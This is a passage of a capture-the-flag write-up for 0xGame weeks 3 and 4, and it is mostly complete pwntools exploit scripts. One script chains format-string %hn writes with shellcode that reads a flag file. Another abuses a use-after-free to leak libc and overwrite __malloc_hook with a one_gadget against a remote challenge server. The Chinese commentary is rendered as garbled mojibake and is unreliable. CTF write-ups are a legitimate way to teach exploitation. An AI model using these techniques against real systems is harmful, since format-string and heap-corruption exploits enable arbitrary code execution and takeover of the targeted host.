#0x27 = 39
payload0 = b'%' + str(what & 0xffff).encode() + b'c%39$hn' + b'\x00'
io.sendafter(b'Say something:',payload0)

payload1 = b'%' + str(ret_a+8 & 0xffff).encode() + b'c%11$hn' + b'\x00'
io.sendafter(b'Say something:',payload1)
payload2 = b'%' + str(0x4010).encode() + b'c%39$hn' + b'\x00'
io.sendafter(b'Say something:',payload2)
payload3 = b'%' + str(ret_a+10 & 0xffff).encode() + b'c%11$hn' + b'\x00'
io.sendafter(b'Say something:',payload3)
payload4 = b'%' + str(0x1451).encode() + b'c%39$hn' + b'\x00'
io.sendafter(b'Say something:',payload4)
payload5 = b'%' + str(ret_a+12 & 0xffff).encode() + b'c%11$hn' + b'\x00'
io.sendafter(b'Say something:',payload5)
payload6 = b'%' + str(0x0001).encode() + b'c%39$hn' + b'\x00'
io.sendafter(b'Say something:',payload6)

get_shell = b'stop\x00'
get_shell = get_shell.ljust(16,b'\x00')
addr = 0x114514170
payload7 = shellcraft.amd64.open("./flag")
payload7 += shellcraft.amd64.read(3,addr,0x30)
payload7 += shellcraft.amd64.write(1,addr,0x30)
payload7 = asm(payload7)
get_shell = get_shell + payload7
io.sendafter(b'Say something:',get_shell)
io.interactive()            
```

æ€»ä½“æ¥è¯´ï¼Œweek3è¿˜æ˜¯æŒºéš¾çš„ï¼Œä½†æ˜¯è¿˜å¥½å°±ä¸‰é“é¢˜ï¼Œä¸‰å¤©å¹²æ‰å˜¿å˜¿å˜¿ã€‚

# 0xgame week4

#### [Week 4] UAF

![logo](../images/24.png)

ç»å…¸èœå•é¢˜ï¼Œæ²¡æœ‰åé—¨å‡½æ•°ï¼Œæ‰€ä»¥è€ƒè™‘ç”¨onegadgetæ‰“malloc_hook

![logo](../images/26.png)

deleå‡½æ•°æœ‰uafæ¼æ´

ç›´æ¥é€šè¿‡unsorted binsæ³„éœ²libcåŸºå€ç„¶åæ‰“uafåŠ«æŒmalloc

ä¸Šä»£ç 

```
from pwn import *
#io = process('./uaf')
io = remote('47.97.58.52',44000)
libc = ELF('libc.so.6')
context(os = 'linux',arch='amd64',log_level='debug')
def add(index,size,content):
    io.sendafter(b'>> ',b'1')
    io.sendafter(b'Enter index: ',str(index).encode())
    io.sendafter(b'Enter size: ',str(size).encode())
    io.sendafter(b'Enter data: ',content)
def dele(index):
    io.sendafter(b'>> ',b'2')
    io.sendafter(b'Enter index: ',str(index).encode())
def show(index):
    io.sendafter(b'>> ',b'3')
    io.sendafter(b'Enter index: ',str(index).encode())
def edit(index,content):
    io.sendafter(b'>> ',b'4')
    io.sendafter(b'Enter index: ',str(index).encode())
    io.sendafter(b'Enter data: ',content)
add(8,0x100,p64(0))
for i in range(7):
   add(i,0x100,p64(0))
for i in range(7):
   dele(i)
dele(8)
#gdb.attach(io)
#pause()
show(8)
io.recvuntil(b'Data: ')
addr = u64(io.recvuntil(b'\n',drop = True).ljust(8,b'\x00'))
libc_base = addr - 0x7d43a8121be0 + 0x7d43a7f35000
print(hex(libc_base))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
add(9,0x70,p64(0))
add(10,0x70,p64(0))
add(11,0x70,p64(0))
dele(9)
dele(10)
dele(11)
edit(11,p64(malloc_hook))
gadget1 = libc_base + 0xe3afe
gadget2 = libc_base + 0xe3b01
add(12,0x70,b'12')
add(13,0x70,p64(gadget2))
print(hex(malloc_hook))
print(hex(gadget1))
#gdb.attach(io)
#pause()
io.sendafter(b'>> ',b'1')
io.sendafter(b'Enter index: ',b'14')
io.sendafter(b'Enter size: ',b'0x70')
io.interactive()
```
